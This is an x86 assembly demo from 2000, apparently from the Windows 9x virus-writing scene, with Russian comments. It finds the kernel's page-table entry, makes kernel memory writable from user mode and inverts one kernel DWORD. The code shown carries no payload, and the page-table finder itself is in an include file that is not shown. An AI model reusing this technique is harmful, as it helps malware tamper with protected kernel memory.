
; EXAMPLE: PAGETABLE finder library (works under win9X+SoftICE only!)
; action: invert first KERNEL's DWORD without entering ring-0
; (x) 2000 Z0MBiE

callW                   macro   x
                        extern  x:PROC
                        call    x
                        endm

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

msg_init                db      'searching for page table',13,10,0
msg_foundat             db      'dword to patch at ',0
msg_ok                  db      'success',13,10,0
msg_err1                db      'error: pagetable not found',13,10,0
msg_err2                db      'error: pagetable found, but memory remains readonly (wrong address returned)',13,10,0
msg_err3                db      'error: unknown shit happened',0

                        .code
start:
                        mov     esi, 0BFF70000h       ; kernel address

                        lea     edx, msg_init
                        call    dump_asciiz

                        call    find_pagetable_dword  ; out: EDI=page entry
                        lea     edx, msg_err1
                        jc      __exit

                        lea     edx, msg_foundat
                        call    dump_asciiz
                        mov     eax, edi
                        call    dump_hexdword
                        call    dump_crlf

                        or      dword ptr [edi], PAGEFLAG_RW  ; set readwrite

                        push    4               ; удостоверимся что все окей
                        push    esi
                        callW   IsBadWritePtr
                        or      eax, eax
                        lea     edx, msg_err2
                        jnz     __exit

                        not     dword ptr [esi] ; пишем в кернел

                         ; сделаем все как было
                        and     dword ptr [edi], not PAGEFLAG_RW

                        lea     edx, msg_ok
__exit:                 call    dump_asciiz

                        push    -1              ; выход
                        callW   ExitProcess

include                 pagetbl.inc     ; pagetable finder
include                 console.inc     ; console io

                        end     start
